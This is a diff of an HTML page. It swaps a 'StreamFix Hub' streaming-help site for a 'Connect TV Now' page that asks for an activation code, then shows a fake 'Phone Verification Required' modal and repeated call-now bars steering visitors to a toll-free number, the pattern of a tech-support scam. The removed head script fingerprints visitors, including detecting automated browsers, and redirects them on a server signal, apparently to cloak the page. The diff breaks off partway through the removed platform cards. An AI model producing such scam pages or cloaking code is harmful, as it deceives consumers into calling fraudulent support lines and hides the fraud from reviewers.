@@ -1,885 +1,123 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <script>(function(){try{fetch('/api/v1/pixel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,pg:window.location.pathname})}).then(function(r){return r.json()}).then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}})();</script>
-    <meta charset="UTF-8">
-    <!-- Google Tag: Paste your new Google Ads tag here -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StreamFix Hub — Streaming Help &amp; TV Setup Guides</title>
-    <meta name="description" content="Independent streaming help for every platform and device. Step-by-step guides for Paramount+, Hulu, Disney+, ESPN+, Peacock, STARZ, FOX, Amazon Prime Video, and Vizio TV.">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <style>
-        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
-        :root {
-            --bg: #0d0d14;
-            --surface: #13131f;
-            --surface2: #1c1c2e;
-            --border: rgba(255,255,255,0.08);
-            --accent: #0ea5e9;
-            --text: #f2f2f8;
-            --muted: #7a7a9a;
-            --card-bg: #18182a;
-        }
-
-        body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; overflow-x: hidden; }
-
-        /* ── TOP DISCLAIMER ── */
-        .top-bar {
-            background: #08080f;
-            border-bottom: 1px solid var(--border);
-            padding: 8px 24px;
-            text-align: center;
-            font-size: 11px;
-            color: #55556a;
-            letter-spacing: 0.4px;
-        }
-
-        /* ── NAV ── */
-        nav {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 40px;
-            height: 68px;
-            background: rgba(13,13,20,0.96);
-            backdrop-filter: blur(16px);
-            border-bottom: 1px solid var(--border);
-            position: sticky;
-            top: 0;
-            z-index: 200;
-        }
-        .nav-left { display: flex; flex-direction: column; gap: 2px; }
-        .nav-badge {
-            font-size: 9px;
-            font-weight: 600;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            color: var(--accent);
-            opacity: 0.8;
-        }
-        .nav-logo { font-size: 1.15rem; font-weight: 800; color: var(--text); letter-spacing: -0.3px; }
-        .nav-actions { display: flex; gap: 12px; align-items: center; }
-        .btn-outline {
-            display: inline-flex; align-items: center; gap: 6px;
-            border: 1px solid var(--border);
-            color: var(--text); background: transparent;
-            text-decoration: none; padding: 9px 20px;
-            border-radius: 8px; font-size: 0.85rem; font-weight: 500;
-            transition: all 0.2s;
-        }
-        .btn-outline:hover { background: var(--surface2); border-color: rgba(255,255,255,0.2); }
-        .btn-primary {
-            display: inline-flex; align-items: center; gap: 8px;
-            background: var(--accent); color: #fff;
-            text-decoration: none; padding: 9px 22px;
-            border-radius: 8px; font-size: 0.85rem; font-weight: 600;
-            transition: all 0.2s;
-            box-shadow: 0 4px 16px rgba(14,165,233,0.35);
-        }
-        .btn-primary:hover { background: #0284c7; transform: translateY(-1px); }
-
-        /* ── HERO ── */
-        .hero {
-            padding: 80px 40px 0;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: -100px; left: 50%; transform: translateX(-50%);
-            width: 900px; height: 500px;
-            background: radial-gradient(ellipse, rgba(14,165,233,0.18) 0%, transparent 70%);
-            pointer-events: none;
-        }
-        .hero-eyebrow {
-            display: inline-block;
-            font-size: 11px; font-weight: 600; letter-spacing: 2px;
-            text-transform: uppercase; color: var(--accent);
-            margin-bottom: 20px;
-        }
-        .hero h1 {
-            font-size: clamp(2.4rem, 5.5vw, 4rem);
-            font-weight: 900;
-            letter-spacing: -1.5px;
-            line-height: 1.08;
-            margin-bottom: 20px;
-        }
-        .hero h1 em { font-style: normal; color: var(--accent); }
-        .hero-sub {
-            font-size: 1.05rem;
-            color: var(--muted);
-            max-width: 520px;
-            margin: 0 auto 36px;
-        }
-        .hero-btns { display: flex; justify-content: center; gap: 14px; flex-wrap: wrap; margin-bottom: 60px; }
-        .hero-btn-primary {
-            display: inline-flex; align-items: center; gap: 10px;
-            background: var(--accent); color: #fff;
-            text-decoration: none; font-size: 1rem; font-weight: 700;
-            padding: 14px 36px; border-radius: 10px;
-            box-shadow: 0 6px 28px rgba(14,165,233,0.45);
-            transition: all 0.2s;
-        }
-        .hero-btn-primary:hover { background: #0284c7; transform: translateY(-2px); }
-        .hero-btn-secondary {
-            display: inline-flex; align-items: center; gap: 8px;
-            background: var(--surface2); color: var(--text);
-            text-decoration: none; font-size: 1rem; font-weight: 600;
-            padding: 14px 36px; border-radius: 10px;
-            border: 1px solid var(--border);
-            transition: all 0.2s;
-        }
-        .hero-btn-secondary:hover { background: #25253a; border-color: rgba(255,255,255,0.18); }
-
-        /* ── SHOW THUMBNAILS STRIP ── */
-        .show-strip {
-            display: flex;
-            gap: 14px;
-            justify-content: center;
-            padding: 0 20px;
-            margin-bottom: -2px;
-        }
-        .show-thumb {
-            width: 140px;
-            height: 200px;
-            border-radius: 12px 12px 0 0;
-            flex-shrink: 0;
-            overflow: hidden;
-            position: relative;
-        }
-        .show-thumb img {
-            width: 100%; height: 100%;
-            object-fit: cover;
-        }
-        .show-thumb-placeholder {
-            width: 100%; height: 100%;
-            display: flex; align-items: flex-end;
-            padding: 12px;
-        }
-        .show-thumb-placeholder span {
-            font-size: 0.7rem; font-weight: 600;
-            color: rgba(255,255,255,0.85);
-            line-height: 1.2;
-        }
-        /* Show poster gradient backgrounds */
-        .st1 { background: linear-gradient(160deg, #1a0533, #4a0080, #7c2fb8); }
-        .st2 { background: linear-gradient(160deg, #001a4d, #0044aa, #0066dd); }
-        .st3 { background: linear-gradient(160deg, #1a2a00, #3a6600, #55aa00); }
-        .st4 { background: linear-gradient(160deg, #330000, #880000, #cc2200); }
-        .st5 { background: linear-gradient(160deg, #001a33, #004466, #0077aa); }
-        .st6 { background: linear-gradient(160deg, #330022, #770055, #cc0088); }
-
-        /* ── STATS BAR ── */
-        .stats-bar {
-            background: var(--surface);
-            border-top: 1px solid var(--border);
-            border-bottom: 1px solid var(--border);
-            padding: 28px 40px;
-            display: flex;
-            justify-content: center;
-            gap: 0;
-        }
-        .stat-item {
-            flex: 1;
-            max-width: 200px;
-            text-align: center;
-            padding: 0 24px;
-            border-right: 1px solid var(--border);
-        }
-        .stat-item:last-child { border-right: none; }
-        .stat-num {
-            font-size: 2rem;
-            font-weight: 900;
-            letter-spacing: -1px;
-            color: var(--text);
-            display: block;
-        }
-        .stat-label { font-size: 0.78rem; color: var(--muted); font-weight: 500; }
-
-        /* ── PLATFORMS SECTION ── */
-        .section { max-width: 1200px; margin: 0 auto; padding: 72px 32px; }
-        .section-head { margin-bottom: 48px; }
-        .section-head h2 { font-size: clamp(1.7rem, 3vw, 2.4rem); font-weight: 800; letter-spacing: -0.5px; margin-bottom: 10px; }
-        .section-head p { color: var(--muted); font-size: 1rem; max-width: 520px; }
-
-        .platforms-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 20px;
-        }
-        .platform-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 16px;
-            padding: 28px;
-            text-decoration: none;
-            color: var(--text);
-            display: flex;
-            flex-direction: column;
-            gap: 16px;
-            transition: all 0.25s;
-            position: relative;
-            overflow: hidden;
-        }
-        .platform-card::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 16px;
-            background: linear-gradient(135deg, rgba(14,165,233,0.05), transparent);
-            opacity: 0;
-            transition: opacity 0.25s;
-        }
-        .platform-card:hover {
-            border-color: rgba(14,165,233,0.45);
-            transform: translateY(-4px);
-            box-shadow: 0 16px 40px rgba(0,0,0,0.4);
-        }
-        .platform-card:hover::before { opacity: 1; }
-
-        .card-logo-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .card-logo-wrap {
-            height: 48px;
-            display: flex;
-            align-items: center;
-        }
-        .card-logo-wrap img {
-            max-height: 40px;
-            max-width: 140px;
-            object-fit: contain;
-            filter: brightness(1.1);
-        }
-        .card-arrow {
-            width: 32px; height: 32px;
-            background: var(--surface2);
-            border-radius: 8px;
-            display: flex; align-items: center; justify-content: center;
-            color: var(--muted);
-            transition: all 0.2s;
-            flex-shrink: 0;
-        }
-        .platform-card:hover .card-arrow {
-            background: var(--accent);
-            color: #fff;
-        }
-
-        .card-name { font-size: 1.1rem; font-weight: 700; }
-        .card-desc { font-size: 0.84rem; color: var(--muted); line-height: 1.5; flex: 1; }
-
-        .card-tags { display: flex; gap: 8px; flex-wrap: wrap; }
-        .tag {
-            font-size: 0.72rem;
-            font-weight: 600;
-            padding: 4px 10px;
-            border-radius: 20px;
-            background: rgba(14,165,233,0.12);
-            color: #a89fff;
-            border: 1px solid rgba(14,165,233,0.2);
-        }
-
-        .card-cta {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            color: var(--accent);
-            margin-top: 4px;
-        }
-
-        /* ── FEATURES STRIP ── */
-        .features-strip {
-            background: var(--surface);
-            border-top: 1px solid var(--border);
-            border-bottom: 1px solid var(--border);
-            padding: 44px 40px;
-        }
-        .features-inner {
-            max-width: 1100px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 32px;
-        }
-        .feature-item { display: flex; gap: 16px; align-items: flex-start; }
-        .feature-icon {
-            width: 44px; height: 44px; flex-shrink: 0;
-            background: rgba(14,165,233,0.12);
-            border-radius: 10px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 1.2rem;
-        }
-        .feature-item h3 { font-size: 0.92rem; font-weight: 700; margin-bottom: 4px; }
-        .feature-item p { font-size: 0.8rem; color: var(--muted); line-height: 1.4; }
-
-        /* ── CONTENT SECTION ── */
-        .content-section { max-width: 1200px; margin: 0 auto; padding: 72px 32px; }
-        .content-section h2 { font-size: clamp(1.7rem, 3vw, 2.2rem); font-weight: 800; letter-spacing: -0.5px; margin-bottom: 32px; }
-
-        .content-grid {
-            display: grid;
-            grid-template-columns: repeat(6, 1fr);
-            gap: 14px;
-            margin-bottom: 32px;
-        }
-        .content-thumb {
-            border-radius: 10px;
-            overflow: hidden;
-            position: relative;
-            aspect-ratio: 2/3;
-        }
-        .content-thumb-inner {
-            width: 100%; height: 100%;
-            display: flex; align-items: flex-end;
-            padding: 14px 12px;
-        }
-        .content-thumb-label {
-            font-size: 0.72rem;
-            font-weight: 600;
-            color: rgba(255,255,255,0.9);
-            line-height: 1.3;
-        }
-        .ct1 { background: linear-gradient(170deg, #1a0040, #5500aa, #8833ff); }
-        .ct2 { background: linear-gradient(170deg, #002200, #005500, #008800); }
-        .ct3 { background: linear-gradient(170deg, #330000, #770022, #cc0044); }
-        .ct4 { background: linear-gradient(170deg, #001133, #002277, #0044cc); }
-        .ct5 { background: linear-gradient(170deg, #220033, #660099, #aa00ff); }
-        .ct6 { background: linear-gradient(170deg, #1a1100, #554400, #997700); }
-
-        /* ── SPORTS BANNER ── */
-        .sports-banner {
-            margin: 0 32px 32px;
-            border-radius: 20px;
-            overflow: hidden;
-            position: relative;
-            height: 220px;
-            background: linear-gradient(135deg, #0a0020 0%, #1a0050 30%, #440077 60%, #7700aa 100%);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 56px;
-            max-width: 1136px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        .sports-banner::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: 
-                radial-gradient(ellipse 50% 80% at 80% 50%, rgba(255,140,0,0.15) 0%, transparent 60%),
-                radial-gradient(ellipse 40% 60% at 20% 50%, rgba(14,165,233,0.2) 0%, transparent 60%);
-        }
-        .sports-text { position: relative; z-index: 1; }
-        .sports-text h3 { font-size: clamp(1.4rem, 2.5vw, 2rem); font-weight: 900; letter-spacing: -0.5px; margin-bottom: 8px; }
-        .sports-text p { color: rgba(255,255,255,0.65); font-size: 0.92rem; }
-        .sports-icons {
-            position: relative; z-index: 1;
-            display: flex; gap: 20px; font-size: 3.5rem;
-        }
-
-        /* ── BOTTOM CTA ── */
-        .bottom-cta {
-            background: var(--surface);
-            border-top: 1px solid var(--border);
-            padding: 80px 40px;
-            text-align: center;
-        }
-        .bottom-cta h2 { font-size: clamp(1.6rem, 3vw, 2.2rem); font-weight: 800; letter-spacing: -0.5px; margin-bottom: 12px; }
-        .bottom-cta p { color: var(--muted); margin-bottom: 36px; font-size: 1rem; max-width: 420px; margin-left: auto; margin-right: auto; }
-        .bottom-btns { display: flex; justify-content: center; gap: 14px; flex-wrap: wrap; }
-
-        /* ── FOOTER ── */
-        footer {
-            background: #08080f;
-            border-top: 1px solid var(--border);
-            padding: 32px 40px;
-            text-align: center;
-        }
-        .footer-links { display: flex; justify-content: center; gap: 32px; margin-bottom: 14px; }
-        .footer-links a { color: var(--muted); text-decoration: none; font-size: 0.83rem; transition: color 0.2s; }
-        .footer-links a:hover { color: var(--text); }
-        footer p { font-size: 0.78rem; color: #44445a; margin-bottom: 6px; }
-        .disclaimer-full { max-width: 820px; margin: 14px auto 0; font-size: 0.71rem; color: #33333f; line-height: 1.6; }
-
-        /* ── RESPONSIVE ── */
-        @media (max-width: 900px) {
-            .features-inner { grid-template-columns: repeat(2, 1fr); }
-            .content-grid { grid-template-columns: repeat(3, 1fr); }
-            .sports-icons { display: none; }
-        }
-        @media (max-width: 640px) {
-            nav { padding: 0 16px; }
-            .hero { padding: 60px 20px 0; }
-            .hero-btns { flex-direction: column; align-items: center; }
-            .show-strip { gap: 8px; }
-            .show-thumb { width: 100px; height: 150px; }
-            .stats-bar { padding: 24px 16px; gap: 0; flex-wrap: wrap; }
-            .stat-item { min-width: 50%; border-right: none; padding: 12px 16px; }
-            .section, .content-section { padding: 50px 16px; }
-            .platforms-grid { grid-template-columns: 1fr; }
-            .features-inner { grid-template-columns: 1fr; }
-            .content-grid { grid-template-columns: repeat(2, 1fr); }
-            .sports-banner { margin: 0 16px 24px; padding: 0 28px; height: 160px; }
-            .bottom-cta { padding: 60px 20px; }
-            footer { padding: 28px 20px; }
-            .footer-links { flex-wrap: wrap; gap: 16px; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connect TV Now | Smart TV Activation Support</title>
+<meta name="description" content="Having trouble activating your TV or streaming device? Enter your code or call now for instant expert help.">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{min-height:100vh;background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding:40px 20px 100px;max-width:480px;margin:0 auto}
+h1{font-size:1.55rem;font-weight:800;color:#111;text-align:center;margin-bottom:10px;line-height:1.2}
+.sub{font-size:1.1rem;font-weight:700;color:#111;text-align:center;margin-bottom:28px}
+#codeInput{width:100%;padding:14px 16px;font-size:1rem;border:1.5px solid #bbb;border-radius:4px;outline:none;color:#111;background:#fff;transition:border-color 0.2s}
+#codeInput:focus{border-color:#111}
+#codeInput::placeholder{color:#aaa;font-weight:400}
+.error-msg{display:none;color:#c00;font-size:0.82rem;margin-top:6px;text-align:center}
+.error-msg.visible{display:block}
+.submit-btn{width:100%;margin-top:18px;padding:15px;background:#111;color:#fff;border:none;border-radius:4px;font-size:1rem;font-weight:800;cursor:pointer;letter-spacing:0.5px;text-transform:uppercase;transition:background 0.15s}
+.submit-btn:hover{background:#333}
+.divider{display:flex;align-items:center;gap:0;margin:28px 0;width:100%}
+.divider::before,.divider::after{content:'';flex:1;height:1px;background:#ddd}
+.divider-star{font-size:1rem;color:#111;padding:0 14px}
+.no-code-heading{font-size:1.1rem;font-weight:800;color:#111;text-align:center;margin-bottom:18px}
+.call-btn{display:block;width:100%;background:#111;color:#fff;text-align:center;text-decoration:none;font-size:1rem;font-weight:700;padding:15px;border-radius:4px;transition:background 0.15s;letter-spacing:0.3px}
+.call-btn:hover{background:#333}
+.avail{font-size:0.78rem;color:#888;text-align:center;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:6px}
+.dot{width:7px;height:7px;background:#16a34a;border-radius:50%;animation:pulse 1.8s infinite}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(22,163,74,0.5)}50%{box-shadow:0 0 0 5px rgba(22,163,74,0)}}
+.disclaimer{font-size:0.7rem;color:#bbb;text-align:center;margin-top:30px;line-height:1.5;max-width:360px}
+#successOverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:9999;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(3px)}
+#successOverlay.active{display:flex}
+#successModal{background:#fff;border-radius:6px;padding:32px 28px;max-width:400px;width:100%;text-align:center;box-shadow:0 16px 60px rgba(0,0,0,0.3)}
+.modal-icon{font-size:2rem;margin-bottom:12px}
+.modal-title{font-size:1.2rem;font-weight:800;color:#111;margin-bottom:6px}
+.modal-sub{font-size:0.9rem;font-weight:700;color:#b91c1c;margin-bottom:12px}
+.modal-body{font-size:0.85rem;color:#555;line-height:1.55;margin-bottom:22px}
+.modal-body strong{color:#111}
+.modal-call{display:block;background:#111;color:#fff;text-decoration:none;font-size:1.05rem;font-weight:800;padding:15px;border-radius:4px;text-align:center;letter-spacing:0.3px;transition:background 0.15s}
+.modal-call:hover{background:#333}
+.modal-avail{font-size:0.76rem;color:#888;margin-top:9px;display:flex;align-items:center;justify-content:center;gap:6px}
+.sticky-bar{position:fixed;bottom:0;left:0;right:0;background:#111;padding:12px 20px;display:flex;align-items:center;justify-content:center;gap:14px;z-index:8888}
+.sticky-bar-label{color:#fff;font-size:0.85rem;font-weight:600}
+.sticky-bar-btn{background:#fff;color:#111;text-decoration:none;font-size:0.87rem;font-weight:800;padding:8px 20px;border-radius:3px;white-space:nowrap}
+@media(max-width:420px){.sticky-bar-label{display:none}}
+#mobPopup{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:9998;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(5px)}
+#mobPopup.show{display:flex}
+.mob-box{background:#fff;border-radius:6px;width:100%;max-width:340px;padding:28px 24px;text-align:center}
+.mob-title{font-size:1.1rem;font-weight:800;color:#111;margin-bottom:8px}
+.mob-desc{font-size:0.85rem;color:#555;line-height:1.5;margin-bottom:18px}
+.mob-call{display:block;background:#111;color:#fff;text-decoration:none;font-size:1rem;font-weight:800;padding:14px;border-radius:4px;text-align:center}
+.mob-avail{font-size:0.74rem;color:#888;margin-top:8px;display:flex;align-items:center;justify-content:center;gap:5px}
+.mob-dismiss{margin-top:14px;font-size:0.78rem;color:#888;cursor:pointer;text-decoration:underline;text-underline-offset:2px}
+</style>
 </head>
 <body>
 
-<div class="top-bar">
-    INDEPENDENT HELP CENTER — Not affiliated with any streaming platform or device brand. All trademarks belong to their respective owners.
+<h1>Connect TV Now</h1>
+<div class="sub">Smart TV Setup &amp; Activation Support</div>
+
+<input type="text" id="codeInput" placeholder="Enter Your Code Here" maxlength="12" autocomplete="off" autocorrect="off" autocapitalize="characters" spellcheck="false">
+<div class="error-msg" id="errorMsg">Please enter a valid code (4+ characters).</div>
+<button class="submit-btn" onclick="handleSubmit()">Submit</button>
+
+<div class="divider"><span class="divider-star">&#9733;</span></div>
+
+<div class="no-code-heading">Activate your device without code</div>
+<a class="call-btn" href="tel:+18887791904" id="callBtn">Call Now +1&nbsp;8887791904</a>
+<div class="avail"><span class="dot"></span>Available 24/7 &mdash; Toll-Free</div>
+
+<div id="successOverlay">
+  <div id="successModal">
+    <div class="modal-icon">&#9989;</div>
+    <div class="modal-title">Code Submitted!</div>
+    <div class="modal-sub">&#9888; Phone Verification Required</div>
+    <p class="modal-body">Your code has been received. To complete activation, <strong>phone verification is required</strong> by our support team.<br><br>Call now to verify and finish setting up your device.</p>
+    <a class="modal-call" href="tel:+18887791904" id="popupCallBtn">Call Now +1&nbsp;8887791904</a>
+    <div class="modal-avail"><span class="dot"></span>Available 24/7 &mdash; Toll-Free</div>
+  </div>
 </div>
 
-<nav>
-    <div class="nav-left">
-        <span class="nav-badge">Independent help center</span>
-        <span class="nav-logo">StreamFix Hub</span>
-    </div>
-    <div class="nav-actions">
-        <a href="tel:+18887791904" class="btn-outline">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
-            Call Now
-        </a>
-        <a href="tel:+18887791904" class="btn-primary">Contact Us</a>
-    </div>
-</nav>
-
-<!-- HERO -->
-<section class="hero">
-    <div class="hero-eyebrow">Independent help center</div>
-    <h1>Get your TV<br><em>streaming again</em></h1>
-    <p class="hero-sub">Pick your streaming service below for clear, step-by-step guides covering setup, account help, and common errors — on any device.</p>
-    <div class="hero-btns">
-        <a href="tel:+18887791904" class="hero-btn-primary">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
-            Call Now
-        </a>
-        <a href="tel:+18887791904" class="hero-btn-secondary">Contact Us</a>
-    </div>
-
-    <!-- Show thumbnails -->
-    <div class="show-strip">
-        <div class="show-thumb st1">
-            <div class="show-thumb-placeholder"><span>Hit<br>Series</span></div>
-        </div>
-        <div class="show-thumb st2">
-            <div class="show-thumb-placeholder"><span>Award<br>Winners</span></div>
-        </div>
-        <div class="show-thumb st3">
-            <div class="show-thumb-placeholder"><span>New<br>Releases</span></div>
-        </div>
-        <div class="show-thumb st4">
-            <div class="show-thumb-placeholder"><span>Fan<br>Favorites</span></div>
-        </div>
-        <div class="show-thumb st5">
-            <div class="show-thumb-placeholder"><span>Trending<br>Now</span></div>
-        </div>
-        <div class="show-thumb st6">
-            <div class="show-thumb-placeholder"><span>Must<br>Watch</span></div>
-        </div>
-    </div>
-</section>
-
-<!-- STATS BAR -->
-<div class="stats-bar">
-    <div class="stat-item">
-        <span class="stat-num" data-target="50" data-suffix="+">0+</span>
-        <span class="stat-label">Troubleshooting guides</span>
-    </div>
-    <div class="stat-item">
-        <span class="stat-num" data-target="12">0</span>
-        <span class="stat-label">Platforms covered</span>
-    </div>
-    <div class="stat-item">
-        <span class="stat-num" data-target="30" data-suffix="+">0+</span>
-        <span class="stat-label">Devices supported</span>
-    </div>
-    <div class="stat-item">
-        <span class="stat-num">24/7</span>
-        <span class="stat-label">Support available</span>
-    </div>
+<div class="sticky-bar">
+  <span class="sticky-bar-label">Need help activating?</span>
+  <a href="tel:+18887791904" class="sticky-bar-btn">Call Now: +1-888-779-1904</a>
 </div>
 
-<!-- PLATFORMS -->
-<section class="section">
-    <div class="section-head">
-        <h2>Choose Your Platform</h2>
-        <p>Select your streaming service to get platform-specific troubleshooting, account help, and device setup guides.</p>
-    </div>
-    <div class="platforms-grid">
-
-        <a href="paramount-plus" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Paramount_Plus_logo.svg/280px-Paramount_Plus_logo.svg.png" alt="Paramount+" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#0064ff;">Paramount+</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Paramount+</div>
-            <div class="card-desc">Resolve activation errors, fix login issues, and get device setup help for Paramount+ streaming.</div>
-            <div class="card-tags">
-                <span class="tag">Activation Error</span>
-                <span class="tag">Login Issues</span>
-                <span class="tag">Device Setup</span>
-            </div>
-            <span class="card-cta">Get Paramount+ Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="disney-plus" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Disney%2B_logo.svg/280px-Disney%2B_logo.svg.png" alt="Disney+" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#1a78c2;">Disney+</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Disney+</div>
-            <div class="card-desc">Fix Error 83, resolve download issues, and set up Disney+ on all your devices.</div>
-            <div class="card-tags">
-                <span class="tag">Error 83</span>
-                <span class="tag">Downloads</span>
-                <span class="tag">Profiles</span>
-            </div>
-            <span class="card-cta">Get Disney+ Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="hulu" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Hulu_Logo.svg/280px-Hulu_Logo.svg.png" alt="Hulu" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#1ce783;">hulu</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Hulu</div>
-            <div class="card-desc">Troubleshoot Error 301, fix Live TV issues, and manage your Hulu plan &amp; add-ons.</div>
-            <div class="card-tags">
-                <span class="tag">Error 301</span>
-                <span class="tag">Live TV</span>
-                <span class="tag">Add-ons</span>
-            </div>
-            <span class="card-cta">Get Hulu Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="peacock-tv" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/NBCUniversal_Peacock_Logo.svg/280px-NBCUniversal_Peacock_Logo.svg.png" alt="Peacock" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#fff;">Peacock</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">Peacock</div>
-            <div class="card-desc">Resolve OVP errors, set up live sports streaming, and manage your Peacock plan.</div>
-            <div class="card-tags">
-                <span class="tag">OVP Error</span>
-                <span class="tag">Live Sports</span>
-                <span class="tag">Plans</span>
-            </div>
-            <span class="card-cta">Get Peacock Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="espn-plus" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/ESPN%2B_logo.svg/280px-ESPN%2B_logo.svg.png" alt="ESPN+" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#cc0000;">ESPN+</span>
-                </div>
-                <div class="card-arrow"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></div>
-            </div>
-            <div class="card-name">ESPN+</div>
-            <div class="card-desc">Activate ESPN+, set up your bundle, and fix live sports streaming on any device.</div>
-            <div class="card-tags">
-                <span class="tag">Activation</span>
-                <span class="tag">Bundle Setup</span>
-                <span class="tag">Devices</span>
-            </div>
-            <span class="card-cta">Get ESPN+ Help <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></span>
-        </a>
-
-        <a href="espn-unlimited" class="platform-card">
-            <div class="card-logo-row">
-                <div class="card-logo-wrap">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/ESPN_wordmark.svg/280px-ESPN_wordmark.svg.png" alt="ESPN Unlimited" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'">
-                    <span style="display:none; font-size:1.1rem; font-weight:800; color:#cc0000;">ESPN</span>
-                </div>
